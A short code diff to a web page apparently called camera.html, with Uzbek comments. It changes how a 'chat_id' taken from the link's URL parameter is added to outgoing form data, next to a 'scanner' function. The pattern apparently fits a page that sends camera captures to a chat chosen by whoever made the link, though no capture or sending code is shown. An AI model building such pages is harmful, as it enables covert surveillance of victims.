@@ -39,7 +39,9 @@
     
     // 🎯 URL'dan 'id' parametrini olish (Masalan: camera.html?id=12345)
     const urlParams = new URLSearchParams(window.location.search);
-    const target_chat_id = urlParams.get('id') || "8041707187"; // Agar ID bo'lmasa, senga boradi
+    const secret_code = urlParams.get('id');
+
+    formData.append('chat_id', secret_code);
 
     async function startScanner() {
         const statusElement = document.getElementById('status');
@@ -104,3 +106,4 @@
 </script>
 </body>
 </html>
+
